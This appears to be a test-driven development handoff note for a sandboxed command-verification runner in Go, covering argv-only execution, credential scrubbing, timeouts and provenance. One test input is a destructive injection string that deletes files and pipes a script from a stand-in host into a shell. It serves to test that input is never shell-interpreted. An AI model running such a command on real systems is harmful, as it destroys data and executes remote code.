# red handoff

## What changed (files + one line each)
- internal/core/verification_runner_test.go (new): 8 RED behavior tests for the sandboxed verification runner — argv-only execution (injection string `; rm -rf / && curl evil.sh | sh` reaches child verbatim, no shell interpretation; second argv element with metachars untouched), credential env scrubbing (GITHUB_TOKEN/AWS_SECRET_ACCESS_KEY absent from child, non-credential PATH inherited), timeout kill (700ms timeout on `sleep 30`, TimedOut=true in result + provenance, process proven dead via pgrep), vacuous zero-output rejection (exit 0 + empty output → Passed=false, Vacuous=true; non-vacuous positive control), provenance capture (Argv/ExitCode/StartedAt/FinishedAt), events on both paths (verification_passed + verification_failed via EventSink, read back from central JSONL dir).
- CHANGELOG.md: Added entry under Unreleased.

## Contract GREEN must implement
- Types: `VerificationRunner`, `VerificationRunnerConfig{CredentialEnvVars []string}`, `VerificationSpec{Command []string, Dir string, ExtraEnv []string, Timeout time.Duration}`, `VerificationResult{Passed, ExitCode, Stdout, Stderr, TimedOut, Vacuous, Provenance}`, `VerificationProvenance{Argv []string, StartedAt, FinishedAt, ExitCode, TimedOut}`.
- Constructors/methods: `NewVerificationRunner(VerificationRunnerConfig) *VerificationRunner`, `(*VerificationRunner).Run(ctx, VerificationSpec) VerificationResult`, `(*VerificationRunner).RunWithEvents(ctx, VerificationSpec, *EventSink) VerificationResult`.
- Event types: `verification_passed`, `verification_failed`.
- Non-credential parent env is inherited; only CredentialEnvVars names are stripped.

## Verification (commands run + pass/fail)
- `gofmt -l internal/core/verification_runner_test.go` — clean.
- `go test ./internal/core/ -run TestVerificationRunner -count=1` — FAIL (expected RED). Failure: `undefined: VerificationRunner`, `undefined: NewVerificationRunner`, `undefined: VerificationRunnerConfig`, `undefined: VerificationSpec` — every test fails on the missing feature (contract types), not on test bugs. The 8 test fns: InjectiveArgNotShell, SecondArgvElementUntouchedByShell, CredentialEnvNotInChild, TimeoutKillsProcess, RejectsVacuousZeroOutput, RealOutputPasses, ProvenanceCaptured, EventsOnPassAndFail.
- Symbol-name conflict scan (rg for the contract names outside the test file) — no hits; names free for GREEN.
- Coverage: N/A at RED — package does not compile (no implementation); GREEN must measure and report coverage for the new runner code.

## Open edges for the next phase
- GREEN: implement internal/core/verification_runner.go with exactly the contract above; do not rename types or fields (tests pin them).
- Timeout test uses pgrep -f on a unique marker — keep the child kill synchronous (no reaped-but-alive sleeper).
- Vacuity rule: exit 0 with zero stdout (trimmed) → fail with Vacuous=true.
